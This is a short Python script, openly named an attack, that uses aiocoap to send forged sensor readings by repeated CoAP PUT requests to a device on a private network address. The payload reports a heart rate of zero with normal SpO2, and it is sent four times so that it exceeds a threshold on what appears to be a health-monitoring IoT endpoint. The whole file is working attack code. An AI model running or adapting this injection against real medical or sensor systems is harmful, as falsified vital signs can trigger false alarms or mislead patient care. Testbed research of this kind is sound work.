import asyncio
from aiocoap import *


async def selective_block_attack():
    context = await Context.create_client_context()
    uri = "coap://192.168.115.142:5683/sensor/data"
    # Send data with heart rate as 0 but SpO2 normal
    for _ in range(4):  # Send multiple times to exceed threshold
        payload = "A:10,20,30|G:5,5,5|H:0|S:98|S:abc123xyz"
        request = Message(code=PUT, uri=uri, payload=payload.encode("utf-8"))
        response = await context.request(request).response
        print(f"Response: {response.code}")
        await asyncio.sleep(1)


# Run the attack
asyncio.run(selective_block_attack())
